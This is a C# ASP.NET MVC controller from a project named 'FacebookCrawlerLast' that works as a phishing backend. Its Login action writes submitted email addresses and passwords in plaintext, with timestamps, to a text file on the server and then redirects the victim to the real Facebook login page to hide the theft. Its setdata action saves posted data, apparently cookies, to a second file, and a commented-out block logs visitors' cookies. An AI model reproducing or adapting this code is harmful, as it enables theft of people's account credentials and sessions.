using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Newtonsoft.Json;
using System.IO;
using System.Web.Services;
using System.Text;

namespace FacebookCrawlerLast.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            //var str = "";
            //string[] allCookies = Request.Cookies.AllKeys;
            //foreach (string cookie in allCookies)
            //{
            //    var c = Request.Cookies[cookie];
            //    str += c.Name + " : " + c.Value + " " + DateTime.Now.ToString() + Environment.NewLine;
            //}

            //using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/onurbeycerez.txt"), true))
            //{
            //    _testData.WriteLine(str);
            //}

            return View();
        }

        public ActionResult LoginPage()
        {
            return View();
        }

        public ActionResult setdata()
        {
            var json = JsonConvert.DeserializeObject(Request["data"]);

            byte[] utf = System.Text.Encoding.UTF8.GetBytes(Request["data"]);

            var postmodel = System.Text.Encoding.UTF8.GetString(utf);

            var str = postmodel;




            using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/cerez.txt"), true))
            {
                _testData.WriteLine(str);
            }

            return View("LoginPage");
        }


        public ActionResult Login(User postModel)
        {
            //string json = JsonConvert.SerializeObject(postModel);

            byte[] utf = System.Text.Encoding.UTF8.GetBytes(Request["mail"]);

            var mail = System.Text.Encoding.UTF8.GetString(utf);

            byte[] utf2 = System.Text.Encoding.UTF8.GetBytes(Request["password"]);

            var password = System.Text.Encoding.UTF8.GetString(utf2);

            var str = "";
            str += "-----------------" + Environment.NewLine;
            str += "Mail : " + mail + Environment.NewLine;
            str += "Şifre : " + password + Environment.NewLine;
            str += "Tarih : " + DateTime.Now.ToString() + Environment.NewLine;
            str += "-----------------" + Environment.NewLine;

            //var dataFile = Server.MapPath("~/App_Data/data.txt");
            //System.IO.File.AppendAllText(@dataFile, str);

            using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/onurbey123.txt"), true))
            {
                _testData.WriteLine(str);
            }

            return Redirect("https://www.facebook.com/login");
        }
    }

    public class User
    {
        public string mail { get; set; }
        public string password { get; set; }
    }
}